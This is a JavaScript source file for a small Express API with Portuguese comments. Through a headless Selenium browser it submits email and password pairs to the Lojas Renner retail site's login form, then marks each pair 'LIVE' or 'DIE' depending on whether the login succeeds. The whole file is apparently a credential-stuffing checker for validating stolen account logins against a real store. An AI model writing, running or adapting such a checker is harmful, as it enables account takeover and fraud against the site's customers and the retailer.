import express from 'express';
import { Builder, By, until } from 'selenium-webdriver';
import chrome from 'selenium-webdriver/chrome.js';
import bodyParser from 'body-parser';
import picocolors from 'picocolors';

const app = express();
const port = 4000;

// Middleware para processar JSON
app.use(bodyParser.json());

// Endpoint para verificar login na Renner
app.post('/api/check-renner', async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email e senha são obrigatórios' });
    }

    let options = new chrome.Options();
    options.addArguments('--log-level=3');
    options.addArguments('--disable-logging');
    options.addArguments('--disable-gpu');
    options.addArguments('--headless'); // Rodar o Chrome sem interface gráfica

    let driver = await new Builder().setChromeOptions(options).forBrowser('chrome').build();

    try {
        // Navegar até a página principal da Renner
        await driver.get('https://www.lojasrenner.com.br/');

        // Clicar no botão de login
        let bntPageLogin = await driver.wait(until.elementLocated(By.className('user-info')), 10000);
        await bntPageLogin.click();

        // Inserir email e senha
        let inputEmail = await driver.wait(until.elementLocated(By.name('login')), 10000);
        let inputPassw = await driver.wait(until.elementLocated(By.name('password')), 10000);
        let loginButton = await driver.wait(until.elementLocated(By.className('Button_button__vcDFE Button_medium__2sh2z')), 10000);

        await inputEmail.sendKeys(email);
        await inputPassw.sendKeys(password);

        await driver.sleep(2000);

        // Clicar no botão de login
        await loginButton.click();

        await driver.sleep(5000);

        // Verificar se o login foi bem-sucedido
        let textElement = await driver.wait(until.elementLocated(By.tagName('body')), 10000);
        let text = await textElement.getText();

        if (text.includes('Esta combinação de usuário e senha é inválida.')) {
            console.log(picocolors.red(`[ DIE ] » ${email} » [ Login inválido ]`));
            return res.json({ status: 'DIE', message: `Login inválido para o email: ${email}` });
        } else {
            console.log(picocolors.green(`[ LIVE ] » ${email} » [ Login válido ]`));
            return res.json({ status: 'LIVE', message: `Login bem-sucedido para o email: ${email}` });
        }

    } catch (error) {
        console.error(picocolors.red(`[ ERROR ] » ${email} » [ Erro ao tentar fazer login: ${error.message} ]`));
        return res.status(500).json({ error: `Erro ao tentar fazer login: ${error.message}` });
    } finally {
        await driver.quit();
    }
});

// Iniciar o servidor
app.listen(port, () => {
    console.log(`API da Renner rodando em http://localhost:${port}`);
});
